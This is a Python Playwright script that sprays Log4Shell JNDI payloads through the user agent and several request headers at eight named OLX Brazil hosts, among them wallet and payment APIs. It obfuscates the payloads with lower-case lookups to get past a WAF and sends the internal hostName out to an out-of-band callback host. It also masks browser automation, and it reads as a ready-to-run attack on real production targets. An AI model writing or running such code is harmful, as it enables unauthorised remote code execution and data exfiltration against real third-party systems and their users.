#!/usr/bin/env python3
"""Inject Log4Shell payloads into CF-fronted OLX hosts via real Chrome navigation
(route interception adds headers). WAF-bypass + hostName exfil. interactsh detects."""
import sys, time
from playwright.sync_api import sync_playwright

OOB = sys.argv[1]
HOSTS = ["apigw.olx.com.br","conta.olx.com.br","wallet.olx.com.br","wallet-api.olx.com.br",
         "goldpayments.olx.com.br","payment-by-chat-api.olx.com.br","api-transaction.olx.com.br",
         "www.olx.com.br"]

def payload(label):   # WAF-bypass jndi + label subdomain
    return "${${lower:j}ndi:${lower:l}dap://"+label+"."+OOB+"/a}"
def payload_host(label):  # exfil internal hostName
    return "${jndi:ldap://${hostName}."+label+"."+OOB+"/a}"

with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(
        user_data_dir="/tmp/olx_prof", channel="chrome", headless=True, locale="pt-BR",
        user_agent=payload("uagen"),  # UA itself is a payload (label uagen)
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR","--disable-blink-features=AutomationControlled"])
    pg = ctx.pages[0] if ctx.pages else ctx.new_page()

    cur = {"label":"x"}
    def handler(route):
        h = dict(route.request.headers)
        L = cur["label"]
        h["X-Forwarded-For"]   = payload(L+"-xff")
        h["X-Api-Version"]     = payload(L+"-ver")
        h["X-Client-Version"]  = payload_host(L+"-cli")
        h["True-Client-IP"]    = payload(L+"-tcip")
        h["X-Forwarded-Host"]  = payload(L+"-xfh")
        h["Authorization"]     = "Bearer "+payload(L+"-auth")
        h["X-Requested-With"]  = payload(L+"-xrw")
        try: route.continue_(headers=h)
        except Exception:
            try: route.continue_()
            except Exception: pass
    pg.route("**/*", handler)

    for host in HOSTS:
        cur["label"] = host.split(".")[0].replace("-","")[:18]
        try:
            r = pg.goto(f"https://{host}/", wait_until="domcontentloaded", timeout=30000)
            print(f"{host}: status={r.status if r else '?'} label={cur['label']}")
        except Exception as e:
            print(f"{host}: ERR {repr(e)[:70]} label={cur['label']}")
        time.sleep(2)
    ctx.close()
print("injection done")
